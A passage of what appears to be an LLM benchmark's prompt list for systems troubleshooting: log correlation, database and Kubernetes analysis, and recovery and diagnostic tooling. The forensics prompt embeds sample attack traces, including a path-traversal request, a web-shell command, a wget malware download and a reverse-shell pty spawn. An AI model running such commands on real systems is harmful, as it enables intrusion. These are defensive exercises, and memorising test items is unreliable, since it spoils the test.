RIP: 0010:[<ffffffffa0358f61>]  [<ffffffffa0358f61>] my_driver_ioctl+0x41/0x280
RSP: 0018:ffffa55a0a3c3d88  EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff8f5a7e3a8000 RCX: 0000000000000000
... [200 more lines of register dumps, stack traces, etc.]
[End kernel panic dump]

Provide:
1. Root cause analysis of the crash with specific code path
2. Identify the tainted flags and their implications
3. Analyze the stack trace to understand the call chain
4. Examine register values to understand the failure mode
5. Check for common vulnerability patterns (null pointer, buffer overflow, etc.)
6. Identify the module responsible and any version information
7. Assess system impact and data corruption risks
8. Provide specific debugging steps to reproduce/fix
9. Analyze CPU and hardware information for relevance
10. Generate remediation recommendations
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 48: Distributed System Log Correlation",
        "prompt": """
Analyze these logs from a distributed system experiencing cascading failures. Correlate events across 5 services:

[Service A - API Gateway - 2000 lines]
2024-01-15 10:15:23.456 INFO [req-123] Incoming request from 192.168.1.100
2024-01-15 10:15:23.458 INFO [req-123] Forwarding to backend service B
2024-01-15 10:15:28.458 ERROR [req-123] Timeout waiting for service B response
... [1997 more lines]

[Service B - Application Server - 2500 lines]
2024-01-15 10:15:23.461 INFO [req-123] Received request from gateway
2024-01-15 10:15:23.462 INFO [req-123] Querying database service C
2024-01-15 10:15:25.462 WARN [req-123] Database query slow: 2000ms
... [2497 more lines]

[Service C - Database - 3000 lines]
2024-01-15 10:15:23.463 INFO Connection from service B established
2024-01-15 10:15:23.465 WARN Lock wait timeout on table 'users'
2024-01-15 10:15:24.465 ERROR Deadlock detected, rolling back transaction
... [2997 more lines]

[Service D - Cache - 1500 lines]
2024-01-15 10:15:22.100 INFO Cache memory usage at 95%
2024-01-15 10:15:23.100 WARN Evicting 10000 entries due to memory pressure
2024-01-15 10:15:24.100 ERROR Unable to allocate memory for new entries
... [1497 more lines]

[Service E - Message Queue - 2000 lines]
2024-01-15 10:15:20.000 INFO Queue depth: 50000 messages
2024-01-15 10:15:25.000 WARN Consumer lag increasing: 5 minutes behind
2024-01-15 10:15:30.000 ERROR Queue full, rejecting new messages
... [1997 more lines]

Analyze to:
1. Create a unified timeline of events across all services
2. Identify the root cause service and initial failure trigger
3. Map the cascade pattern - how failure propagated
4. Find critical points where cascade could have been prevented
5. Identify missing error handling and timeout configurations
6. Detect resource exhaustion patterns leading to failure
7. Analyze retry storms and backpressure failures
8. Find configuration mismatches between services
9. Generate a service dependency failure map
10. Provide specific remediation for each service
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 49: Performance Profile Analysis",
        "prompt": """
Analyze this comprehensive system performance profile collected during a production incident:

[CPU Profile - 3000 samples]
  45.3%  [kernel]  [k] native_queued_spin_lock_slowpath
  12.1%  mysqld    [.] buf_page_get_gen
   8.7%  [kernel]  [k] _raw_spin_lock
   5.2%  app_srv   [.] malloc
... [2996 more samples]

[Memory Profile - /proc/meminfo snapshots over 1 hour]
Time: 00:00 MemTotal: 128GB MemFree: 2GB Cached: 40GB SwapTotal: 8GB SwapFree: 0GB
Time: 00:05 MemTotal: 128GB MemFree: 1GB Cached: 20GB SwapTotal: 8GB SwapFree: 0GB
... [100 more snapshots]

[I/O Profile - iostat data]
Device    r/s     w/s     rkB/s   wkB/s   await  r_await  w_await  %util
sda     2341.00  156.00  93640.0  2496.0  145.3   142.1    193.2   99.8
... [500 more lines]

[Network Profile - ss statistics]
State  Recv-Q  Send-Q  Local:Port  Peer:Port
ESTAB  0       2043520 10.0.0.5:80 10.0.0.100:45123
... [1000 more connections]

[Application Metrics]
request_latency_p99: 5000ms -> 30000ms (degradation over 1 hour)
error_rate: 0.1% -> 45% 
active_connections: 1000 -> 25000
... [200 more metrics]

Analyze to:
1. Identify the primary bottleneck (CPU/Memory/I/O/Network)
2. Correlate kernel spinlock contention with application behavior
3. Analyze memory pressure and its impact on performance
4. Identify I/O patterns suggesting thrashing or poor access patterns
5. Find network congestion or connection exhaustion issues
6. Map performance degradation timeline with specific triggers
7. Identify feedback loops making the problem worse
8. Find tuning parameters that could alleviate issues
9. Detect signs of resource starvation or priority inversion
10. Generate specific optimization recommendations with expected impact
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 50: Security Incident Forensics",
        "prompt": """
Analyze this comprehensive security incident data to reconstruct the attack:

[Auth Logs - 5000 lines]
Jan 15 02:15:23 server sshd[12345]: Failed password for invalid user admin from 185.234.218.15
Jan 15 02:15:25 server sshd[12346]: Failed password for invalid user root from 185.234.218.15
... [4998 more lines showing various auth attempts, some successful]

[Apache Access Logs - 8000 lines]
185.234.218.15 - - [15/Jan/2024:02:30:15] "GET /admin/../../../../../etc/passwd HTTP/1.1" 404
185.234.218.15 - - [15/Jan/2024:02:30:16] "POST /upload.php HTTP/1.1" 200
192.168.1.100 - - [15/Jan/2024:02:30:45] "GET /shell.php?cmd=whoami HTTP/1.1" 200
... [7997 more lines]

[System Call Audit Logs - 10000 events]
type=SYSCALL msg=audit(1705289415.234:9876): arch=x86_64 syscall=execve success=yes exe="/tmp/.hidden"
type=SYSCALL msg=audit(1705289420.123:9877): arch=x86_64 syscall=connect success=yes addr=185.234.218.15:4444
... [9998 more events]

[File Integrity Monitoring - 2000 changes]
[02:31:00] ADDED: /tmp/.hidden (755 root:root) SHA256:a1b2c3d4...
[02:31:05] MODIFIED: /etc/crontab SHA256:before:x1y2z3... after:p9q8r7...
[02:31:10] ADDED: /var/www/html/shell.php (644 www-data:www-data)
... [1997 more changes]

[Network Flows - 3000 connections]
02:30:00 TCP 192.168.1.100:39284 -> 185.234.218.15:4444 Established 5MB sent
02:31:00 TCP 192.168.1.100:39285 -> 185.234.218.15:443 Established 50MB sent
... [2998 more flows]

[Process Tree Snapshot at incident time]
\_ /usr/sbin/apache2
   \_ /bin/sh -c cd /tmp && wget http://185.234.218.15/malware
   \_ /tmp/.hidden
      \_ /bin/bash -i
         \_ python -c import pty;pty.spawn("/bin/bash")
... [Full process tree with 500 processes]

Analyze to:
1. Reconstruct the complete attack timeline with phases
2. Identify initial compromise vector and exploit used
3. Track lateral movement and privilege escalation steps
4. Find all persistence mechanisms established
5. Identify data exfiltration: what, how much, where to
6. Map all compromised accounts and systems
7. Find IOCs (Indicators of Compromise) for threat hunting
8. Assess the sophistication level and likely threat actor
9. Identify security control failures that enabled the attack
10. Generate immediate containment and long-term remediation plans
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 51: Container Runtime Deep Inspection",
        "prompt": """
Analyze this detailed container runtime state for security and performance issues:

[Docker Daemon State - 2000 lines]
Containers: 487 (Running: 423, Paused: 2, Stopped: 62)
Images: 1847
Server Version: 20.10.23
Storage Driver: overlay2
 Backing Filesystem: xfs
 Supports d_type: true
 Native Overlay Diff: true
... [1994 more configuration lines]

[Container Inspect Output - 50 containers x 200 lines each]
Container: web-frontend-7d4b8c
{
  "State": {
    "Status": "running",
    "Pid": 28456,
    "OOMKilled": true,
    "RestartCount": 47,
    "StartedAt": "2024-01-15T10:00:00Z"
  },
  "HostConfig": {
    "Privileged": true,
    "Capabilities": ["SYS_ADMIN", "NET_ADMIN"],
    "SecurityOpt": ["apparmor=unconfined"],
    "Memory": 0,
    "CpuShares": 2
  },
  "Mounts": [
    {"Type": "bind", "Source": "/", "Destination": "/host", "RW": true}
  ]
}
... [49 more containers]

[cgroup Statistics - 5000 lines]
/docker/7d4b8c.../memory.current: 8589934592
/docker/7d4b8c.../memory.events: oom_kill 47
/docker/7d4b8c.../cpu.stat: throttled_time 3847298374923
... [4997 more lines]

[Network Namespace Analysis - 3000 lines]
nsenter -t 28456 -n ss -tuln
State  Local Address:Port  Process
LISTEN 0.0.0.0:22         sshd
LISTEN 0.0.0.0:8080       java
... [2998 more lines]

[seccomp Profile Analysis - 1000 lines]
Container: web-frontend-7d4b8c
Seccomp: disabled
---
Container: api-backend-9f3a2e  
Seccomp: custom
Allowed: [read, write, open, close, stat, fstat, mmap, ...]
Blocked: [ptrace, mount, ...]
... [998 more profile lines]

Analyze to:
1. Identify containers with dangerous security configurations
2. Find resource limit misconfigurations causing instability
3. Detect container escape risks (privileged, cap_sys_admin, etc.)
4. Analyze OOM patterns and memory leak indicators
5. Find CPU throttling impact on application performance
6. Identify network exposure risks (0.0.0.0 bindings)
7. Assess image vulnerabilities and update priorities
8. Detect crypto-mining or malicious container indicators
9. Find performance bottlenecks from cgroup statistics
10. Generate hardening recommendations for each container
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 52: Database Query Performance Analysis",
        "prompt": """
Analyze this PostgreSQL slow query log and system state during a performance crisis:

[Slow Query Log - 5000 queries]
2024-01-15 10:00:00 UTC [28456]: [1-1] user=app_user,db=production LOG: duration: 45234.123 ms
  statement: SELECT u.*, o.*, p.* FROM users u 
  LEFT JOIN orders o ON u.id = o.user_id 
  LEFT JOIN products p ON o.product_id = p.id 
  WHERE u.created_at > '2023-01-01' 
  AND NOT EXISTS (
    SELECT 1 FROM user_sessions us WHERE us.user_id = u.id
  )
  ORDER BY u.id, o.created_at DESC;

2024-01-15 10:00:45 UTC [28457]: [1-1] user=app_user,db=production LOG: duration: 67890.456 ms
  statement: WITH RECURSIVE category_tree AS (
    SELECT id, parent_id, name, 0 as level 
    FROM categories WHERE parent_id IS NULL
    UNION ALL
    SELECT c.id, c.parent_id, c.name, ct.level + 1
    FROM categories c 
    INNER JOIN category_tree ct ON c.parent_id = ct.id
  )
  SELECT * FROM category_tree ORDER BY level, name;
... [4998 more queries]

[pg_stat_statements - Top 100 queries by total time]
query                                    | calls  | total_time   | mean_time | stddev_time
-----------------------------------------+--------+--------------+-----------+-------------
SELECT * FROM large_table WHERE $1       | 584921 | 8493829.23  | 14.52     | 234.5
UPDATE users SET last_seen = $1 WHERE $2 | 923847 | 7234234.45  | 7.83      | 12.3
... [98 more entries]

[Table Statistics - 500 tables]
schemaname | tablename       | n_live_tup | n_dead_tup | last_vacuum         | last_analyze
-----------+-----------------+------------+------------+---------------------+------------------
public     | users           | 45839204   | 23492834   | 2024-01-01 00:00:00 | 2023-12-01 00:00:00
public     | orders          | 928374923  | 82934782   | NULL                | 2023-06-01 00:00:00
... [498 more tables]

[Index Usage Statistics - 1000 indexes]
schemaname | tablename | indexname              | idx_scan | idx_tup_read | idx_tup_fetch | idx_blks_hit
-----------+-----------+------------------------+----------+--------------+---------------+--------------
public     | users     | users_pkey            | 9283847  | 9283847      | 9283847       | 2834782
public     | users     | idx_users_created_at  | 0        | 0            | 0             | 0
... [998 more indexes]

[Lock Analysis - Current locks]
pid   | relation     | mode                | granted | wait_start
------+--------------+---------------------+---------+------------------------
28456 | users        | AccessShareLock     | t       | 
28457 | users        | AccessExclusiveLock | f       | 2024-01-15 10:05:00
... [200 more lock entries]

[System Metrics During Incident]
Time   | CPU% | IOWait% | MemoryUsed | SwapUsed | ReadMB/s | WriteMB/s
-------+------+---------+------------+----------+----------+-----------
10:00  | 95   | 45      | 98%        | 75%      | 2400     | 100
10:01  | 99   | 67      | 99%        | 85%      | 3200     | 50
... [60 minutes of metrics]

Analyze to:
1. Identify queries with problematic execution patterns
2. Find missing indexes based on query patterns
3. Detect table bloat requiring maintenance
4. Analyze lock contention and deadlock risks
5. Find queries that should be rewritten for performance
6. Identify statistics drift causing bad query plans
7. Detect resource exhaustion correlation with queries
8. Find N+1 query patterns and ORM inefficiencies
9. Generate index creation and query optimization recommendations
10. Prioritize maintenance tasks (VACUUM, ANALYZE, REINDEX)
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 53: Kubernetes Cluster State Analysis",
        "prompt": """
Analyze this Kubernetes cluster state during a major incident:

[Node Status - 50 nodes]
NAME          STATUS     ROLES    AGE   VERSION   CONDITIONS
k8s-node-01   Ready      worker   90d   v1.27.3   MemoryPressure=True,DiskPressure=False,PIDPressure=False
k8s-node-02   NotReady   worker   90d   v1.27.3   MemoryPressure=True,DiskPressure=True,PIDPressure=True
k8s-node-03   Ready      master   90d   v1.27.3   MemoryPressure=False,DiskPressure=False,PIDPressure=False
... [47 more nodes]

[Pod Status - 2000 pods across all namespaces]
NAMESPACE   NAME                           READY   STATUS             RESTARTS   AGE
production  api-deployment-7d4b8c-x9z2    0/1     CrashLoopBackOff   342        5d
production  api-deployment-7d4b8c-k3n4    0/1     OOMKilled          89         5d
production  web-frontend-9g8h7-m2n3       1/1     Running            0          1h
production  web-frontend-9g8h7-p4q5       0/1     ImagePullBackOff   0          3h
... [1996 more pods]

[Events - Last 1000 events]
LAST SEEN   TYPE      REASON              OBJECT                           MESSAGE
2m          Warning   FailedScheduling    pod/api-deployment-7d4b8c-a1b2  0/50 nodes are available: insufficient memory
5m          Warning   OOMKilling          pod/api-deployment-7d4b8c-k3n4  Memory cgroup out of memory: Killed process 28456
10m         Warning   NodeNotReady        node/k8s-node-02                Node k8s-node-02 status is now: NodeNotReady
15m         Warning   FailedMount         pod/web-frontend-9g8h7-p4q5     Unable to attach volume: timeout
... [996 more events]

[ResourceQuota Status - All namespaces]
NAMESPACE   NAME              USED                      HARD
production  compute-quota     requests.cpu: 450/500    requests.cpu: 500
production  compute-quota     requests.memory: 950Gi/1Ti requests.memory: 1Ti
staging     compute-quota     requests.cpu: 50/100     requests.cpu: 100
... [20 more quotas]

[PVC Status - 500 persistent volume claims]
NAMESPACE   NAME          STATUS   VOLUME              CAPACITY   STORAGECLASS
production  data-vol-0    Bound    pvc-7d4b8c9e       100Gi      fast-ssd
production  data-vol-1    Pending                                 fast-ssd
production  logs-vol-0    Lost     pvc-9f8e7d6c       50Gi       standard
... [497 more PVCs]

[Network Policies - 100 policies]
NAMESPACE   NAME              POD-SELECTOR         INGRESS-RULES   EGRESS-RULES
production  deny-all          <all>                0               0
production  allow-frontend    app=frontend         2               1
production  allow-backend     app=backend          1               3
... [97 more policies]

[HPA Status - 50 autoscalers]
NAMESPACE   NAME          REFERENCE                    TARGETS           MINPODS   MAXPODS   REPLICAS
production  api-hpa       Deployment/api-deployment    CPU: 95%/70%     5         50        50
production  web-hpa       Deployment/web-frontend      CPU: 45%/70%     3         30        15
... [48 more HPAs]

[Service Endpoints - 200 services]
NAMESPACE   NAME          ENDPOINTS                                            AGE
production  api-service   <none>                                               5d
production  web-service   10.244.1.5:8080,10.244.2.6:8080,10.244.3.7:8080   5d
... [198 more services]

Analyze to:
1. Identify cascading failure patterns across the cluster
2. Find resource bottlenecks causing scheduling failures  
3. Analyze pod failure reasons and remediation strategies
4. Detect misconfigured resource requests/limits
5. Identify storage issues affecting application availability
6. Find network policy conflicts causing connectivity issues
7. Analyze HPA behavior and scaling bottlenecks
8. Detect node-level issues affecting cluster stability
9. Identify namespace quota exhaustion patterns
10. Generate cluster recovery and optimization plan
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 54: Comprehensive Network Traffic Analysis",
        "prompt": """
Analyze this detailed network capture and flow data for security and performance issues:

[tcpdump Summary - 10000 packets]
10:00:00.123456 IP 10.0.0.5.39284 > 185.234.218.15.443: Flags [S], seq 1234567890
10:00:00.123457 IP 185.234.218.15.443 > 10.0.0.5.39284: Flags [S.], seq 987654321, ack 1234567891
10:00:00.123458 IP 10.0.0.5.39284 > 185.234.218.15.443: Flags [.], ack 1
10:00:00.123459 IP 10.0.0.5.39284 > 185.234.218.15.443: Flags [P.], seq 1:1461, ack 1, length 1460
... [9996 more packets]

[Flow Statistics - 5000 flows]
Proto | Src IP:Port        | Dst IP:Port         | Packets | Bytes    | Duration | Flags
TCP   | 10.0.0.5:39284    | 185.234.218.15:443 | 45823   | 52428800 | 3600s    | ESTABLISHED
TCP   | 10.0.0.5:39285    | 192.168.1.100:22   | 234     | 23456    | 5s       | RST
UDP   | 10.0.0.5:53       | 8.8.8.8:53         | 10000   | 500000   | 3600s    | 
... [4997 more flows]

[DPI (Deep Packet Inspection) Results - 2000 identified protocols]
HTTP/1.1:  2341 flows, 234MB transferred
HTTPS:     5832 flows, 5.2GB transferred  
SSH:       234 flows, 123MB transferred
DNS:       10234 flows, 50MB transferred
BitTorrent: 23 flows, 2.3GB transferred
Unknown:   834 flows, 923MB transferred
... [1994 more protocol identifications]

[Anomaly Detection Results - 500 anomalies]
Type: Port Scan
  Source: 185.234.218.15
  Target: 10.0.0.0/24
  Ports: 1-65535
  Time: 10:15:00-10:16:00

Type: DDoS Pattern
  Target: 10.0.0.5:80
  Sources: 5000+ unique IPs
  Pattern: SYN flood
  Rate: 50000 pps

Type: Data Exfiltration
  Source: 10.0.0.5
  Destination: 185.234.218.15
  Volume: 5GB in 5 minutes
  Pattern: Steady stream, encrypted
... [496 more anomalies]

[Connection State Analysis]
State         | Count  | Percentage
ESTABLISHED   | 23456  | 45%
TIME_WAIT     | 15234  | 29%
SYN_SENT      | 8234   | 16%
CLOSE_WAIT    | 3456   | 7%
FIN_WAIT1     | 1234   | 2%
SYN_RECV      | 456    | 1%

[Bandwidth Usage by Application]
Application | Inbound  | Outbound | Total    | Peak Rate
Web         | 2.3GB    | 15.6GB   | 17.9GB   | 1.2Gbps
Database    | 5.4GB    | 1.2GB    | 6.6GB    | 800Mbps
Backup      | 123MB    | 45.6GB   | 45.7GB   | 5Gbps
... [20 more applications]

[Geographic Traffic Analysis]
Country     | Inbound Connections | Outbound Connections | Suspicious Score
US          | 12345              | 23456                | Low
CN          | 5432               | 123                  | High
RU          | 3456               | 456                  | High
... [50 more countries]

Analyze to:
1. Identify ongoing attacks (DDoS, port scans, exploitation attempts)
2. Detect data exfiltration patterns and volume
3. Find performance bottlenecks from connection states
4. Identify suspicious geographic patterns
5. Detect protocol anomalies and misuse
6. Analyze bandwidth consumption patterns
7. Find indicators of compromised systems
8. Identify poorly configured applications (connection leaks, etc.)
9. Detect encrypted malicious traffic patterns
10. Generate network security and optimization recommendations
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 55: Multi-Layer Application Debugging",
        "prompt": """
Analyze this multi-layer application debugging data to identify the root cause of intermittent failures:

[Application Logs - 3000 lines with stack traces]
2024-01-15 10:00:00.123 ERROR [RequestID: abc-123] NullPointerException in UserService.java:156
    at com.app.service.UserService.processUser(UserService.java:156)
    at com.app.controller.UserController.updateUser(UserController.java:89)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    ... 45 more lines of stack trace
2024-01-15 10:00:00.456 WARN [RequestID: abc-123] Database connection pool exhausted, waiting...
2024-01-15 10:00:05.456 ERROR [RequestID: abc-123] Timeout waiting for database connection
... [2997 more log lines]

[JVM Heap Dump Analysis Summary]
Total Heap: 8GB
Used Heap: 7.8GB
Object Count: 45,234,567
Largest Objects:
  - HashMap (2.3GB) containing 5 million User objects
  - ArrayList (1.8GB) containing cached query results
  - byte[][] (1.2GB) appearing to be leaked image data
Leak Suspects:
  - com.app.cache.UserCache: Growing unbounded
  - com.app.image.ImageProcessor: Not releasing processed images
... [500 more lines of heap analysis]

[Thread Dump - 200 threads]
"http-nio-8080-exec-1" #28 daemon prio=5 os_prio=0 tid=0x00007f4a2c001000 nid=0x7f waiting for monitor entry
   java.lang.Thread.State: BLOCKED (on object monitor)
        at com.app.service.UserService.synchronized(UserService.java:234)
        - waiting to lock <0x000000076ab62208> (a java.lang.Object)
        - locked <0x000000076ab62208> (a java.lang.Object)
        at com.app.controller.UserController.getUser(UserController.java:45)
... [199 more thread states]

[Database Profiling Data]
Query: SELECT * FROM users WHERE id = ?
  Execution Count: 584,291
  Avg Time: 1.2ms
  Max Time: 45,234ms (during incident)
  
Query: UPDATE user_sessions SET last_seen = NOW() WHERE user_id = ?
  Execution Count: 892,734  
  Avg Time: 0.5ms
  Max Time: 30,123ms (during incident)
  Lock Waits: 23,456
... [100 more query profiles]

[GC Logs Analysis]
[GC (Allocation Failure) 7234.123: [ParNew: 1048576K->104857K(1048576K), 0.234567 secs]
[Full GC (Ergonomics) 7456.789: [CMS: 6291456K->5242880K(7340032K), 12.345678 secs]
[GC (CMS Final Remark) 7589.234: [Rescan (parallel), 2.345678 secs]
GC Summary:
  - Young GC: 5823 times, Total pause: 234.5s
  - Full GC: 89 times, Total pause: 1098.7s
  - Longest pause: 23.4s
... [1000 more GC events]

[System Metrics Correlation]
Time     | CPU% | Memory% | GC% | DB Conn | Response Time | Error Rate
10:00:00 | 45   | 60      | 5   | 50/100  | 50ms         | 0.1%
10:00:30 | 67   | 75      | 15  | 75/100  | 200ms        | 0.5%
10:01:00 | 89   | 85      | 35  | 95/100  | 2000ms       | 5%
10:01:30 | 99   | 95      | 78  | 100/100 | 30000ms      | 45%
... [120 more time points]

[Network Trace Between App and DB]
10:00:00.123 APP->DB: SELECT * FROM users WHERE id = 12345
10:00:00.125 DB->APP: (1 row returned in 2ms)
10:00:00.456 APP->DB: BEGIN TRANSACTION
10:00:00.457 APP->DB: UPDATE users SET last_login = NOW() WHERE id = 12345
10:00:30.457 APP->DB: [Connection timeout after 30s]
10:00:30.458 APP: Opens new connection
10:00:30.459 APP->DB: SELECT 1 (connection test)
10:01:00.459 DB->APP: ERROR: connection limit reached
... [5000 more network events]

Analyze to:
1. Identify the root cause of the cascading failure
2. Find memory leaks and their sources
3. Detect deadlocks and lock contention issues
4. Analyze GC impact on application performance
5. Identify database connection pool problems
6. Find inefficient queries causing slowdowns
7. Detect thread pool exhaustion patterns
8. Correlate system metrics with application behavior
9. Identify configuration issues (pool sizes, timeouts, etc.)
10. Generate specific code fixes and configuration changes
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },

    # ========== REAL-WORLD TROUBLESHOOTING SCENARIOS (56-75) ==========
    {
        "name": "Test 56: Production Database Corruption Recovery",
        "prompt": """
A production PostgreSQL database has corruption after a power failure. Write a recovery script that:
1. Checks pg_control for the last checkpoint location using pg_controldata
2. Analyzes WAL files in pg_wal to find the last consistent state
3. Uses pg_resetwal carefully with calculated values for transaction ID, OID, and multitransaction ID
4. Implements a page-level corruption check using pg_checksums
5. Extracts salvageable data from corrupted tables using pageinspect extension
6. Rebuilds corrupted indexes after identifying them with bt_index_check()
7. Validates referential integrity after recovery using foreign key checks
8. Creates a recovery report documenting data loss and recovery actions
Include safety checks to prevent data loss and detailed logging of each step.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 57: Kernel Panic Root Cause Analysis",
        "prompt": """
Create a kernel panic analysis toolkit that:
1. Parses kdump/crash dumps to extract panic information
2. Analyzes the call stack to identify the faulting module and function
3. Decodes kernel symbols and inline functions from vmlinux
4. Checks for known hardware issues based on MCE (Machine Check Exception) logs
5. Analyzes kernel taint flags and their implications
6. Searches for similar panics in kernel bugzilla and LKML
7. Generates a disassembly of the faulting code section
8. Checks for race conditions based on CPU and lock states
9. Analyzes memory corruption patterns if present
10. Produces a detailed report with debugging recommendations
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 58: Distributed System Split-Brain Resolution",
        "prompt": """
Design a split-brain detection and resolution system for a distributed database cluster:
1. Implement a quorum-based node health checker using multiple communication channels
2. Detect network partitions using both heartbeat and application-level checks
3. Implement a STONITH (Shoot The Other Node In The Head) mechanism safely
4. Create a data reconciliation process for diverged replicas
5. Track and resolve conflicting writes using vector clocks
6. Implement automatic failover with data consistency guarantees
7. Create a partition history tracker to prevent repeated split-brains
8. Design a manual override system for operator intervention
9. Generate detailed logs of all decisions for post-mortem analysis
Include safeguards against data loss and cascading failures.
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 59: Performance Regression Detection",
        "prompt": """
Build an automated performance regression detection system:
1. Collect baseline performance metrics using perf, eBPF, and application metrics
2. Implement statistical analysis to detect significant deviations (t-test, z-score)
3. Correlate regressions with system changes (kernel updates, deployments, config changes)
4. Use flame graphs to compare CPU usage patterns between versions
5. Analyze memory allocation patterns for increased pressure
6. Track syscall latency changes using ftrace
7. Monitor network stack performance changes
8. Implement automatic bisection to find the commit causing regression
9. Generate detailed comparison reports with specific bottleneck identification
10. Create rollback recommendations based on severity
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 60: Storage Array Failure Recovery",
        "prompt": """
Handle a critical storage array failure scenario:
1. Detect failed drives in RAID arrays using mdadm and hardware RAID tools
2. Assess data integrity across remaining drives using checksums
3. Implement emergency read-only mode to prevent further corruption
4. Create a priority-based data recovery plan based on business impact
5. Use ddrescue to recover data from failing drives with bad sectors
6. Rebuild RAID arrays with optimal stripe size for recovery performance
7. Implement continuous backup during recovery to prevent data loss
8. Monitor array rebuild progress and estimate completion time
9. Validate recovered data integrity using application-level checks
10. Create a post-mortem report with failure analysis and prevention recommendations
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 61: Memory Leak Detection in Production",
        "prompt": """
Create a production-safe memory leak detection and analysis system:
1. Use process_vm_readv to read process memory without attaching
2. Track heap growth patterns over time using /proc/PID/status
3. Analyze malloc patterns using LD_PRELOAD interception
4. Identify leaked objects using conservative garbage collection scanning
5. Generate heap allocation flame graphs for visualization
6. Correlate memory growth with application events and requests
7. Implement automatic heap dumping when thresholds are exceeded
8. Analyze core dumps for memory leak patterns without stopping the process
9. Track native memory leaks in JNI or other FFI code
10. Generate actionable reports with specific allocation sites
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 62: Network Congestion Diagnosis",
        "prompt": """
Build a comprehensive network congestion diagnostic tool:
1. Monitor TCP retransmission rates and patterns per connection
2. Analyze packet capture for congestion indicators (ECN, window scaling)
3. Track buffer bloat symptoms using ping RTT variance
4. Measure actual vs advertised bandwidth using various algorithms
5. Identify congestion sources: local, ISP, or remote
6. Analyze traffic shaping and QoS policy effectiveness
7. Detect and quantify packet loss patterns (random vs burst)
8. Monitor TCP congestion window evolution
9. Identify optimal TCP congestion control algorithm for workload
10. Generate network optimization recommendations
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 63: Container Escape Detection",
        "prompt": """
Implement a container escape detection and prevention system:
1. Monitor /proc/*/root symlinks for container boundary violations
2. Track capability usage and detect suspicious capability requests
3. Monitor namespace changes using inotify on /proc/*/ns/
4. Detect privileged container indicators and runtime changes
5. Track mount operations that could lead to host filesystem access
6. Monitor kernel module loading attempts from containers
7. Detect ptrace usage that could indicate escape attempts
8. Track cgroup escape attempts through release_agent
9. Monitor for known container escape exploits (CVE patterns)
10. Implement real-time alerting and automatic container termination
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 64: Elasticsearch Cluster Recovery",
        "prompt": """
Handle a failed Elasticsearch cluster recovery:
1. Assess cluster health and identify failed nodes using _cluster/health
2. Analyze shard allocation failures using _cluster/allocation/explain
3. Force allocate stalled shards with allocation decision override
4. Recover corrupted indices from translog using recovery API
5. Reindex corrupted data using scroll and bulk APIs
6. Optimize shard allocation for faster recovery
7. Monitor recovery progress and adjust thread pools
8. Handle split-brain scenarios with master election
9. Validate data integrity post-recovery using checksums
10. Implement preventive measures based on failure analysis
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 65: SSL/TLS Debugging Suite",
        "prompt": """
Create a comprehensive SSL/TLS debugging toolkit:
1. Analyze certificate chains for validity and trust issues
2. Detect weak cipher suites and protocol versions
3. Test for common vulnerabilities (POODLE, BEAST, CRIME)
4. Monitor certificate expiration and renewal failures
5. Debug SNI (Server Name Indication) issues
6. Analyze TLS handshake failures with detailed error codes
7. Test OCSP stapling and revocation checking
8. Verify certificate pinning implementation
9. Debug mutual TLS authentication issues
10. Generate detailed reports with remediation steps
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 66: Microservices Tracing Analysis",
        "prompt": """
Build a distributed tracing analysis system for microservices:
1. Correlate traces across multiple services using trace IDs
2. Identify critical path and bottlenecks in request flow
3. Detect retry storms and cascading failures
4. Analyze service dependency failures and timeout propagation
5. Calculate true end-to-end latency including queue times
6. Identify missing or broken trace spans
7. Detect circuit breaker activations and their impact
8. Analyze distributed transaction failures
9. Generate service dependency maps from trace data
10. Provide optimization recommendations for identified bottlenecks
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 67: Hypervisor Performance Debugging",
        "prompt": """
Debug virtualization performance issues at the hypervisor level:
1. Analyze VM exit reasons and frequencies using kvm_stat
2. Monitor EPT/NPT violations and shadow page table overhead
3. Track CPU steal time and hypervisor scheduling fairness
4. Analyze memory ballooning impact on guest performance
5. Monitor SR-IOV and virtio device performance
6. Detect NUMA misalignment between host and guest
7. Track live migration impact on application performance
8. Analyze hypervisor CPU overcommit ratios
9. Monitor nested virtualization overhead
10. Generate tuning recommendations for both host and guest
""",
        "params": {
            "max_tokens": 16384,
            "temperature": 0.1,
            "stream": False
        }
    },
    {
        "name": "Test 68: Service Mesh Debugging",
        "prompt": """
Create a service mesh (Istio/Linkerd) debugging toolkit:
1. Analyze Envoy proxy configurations and inconsistencies
2. Debug mTLS certificate propagation issues
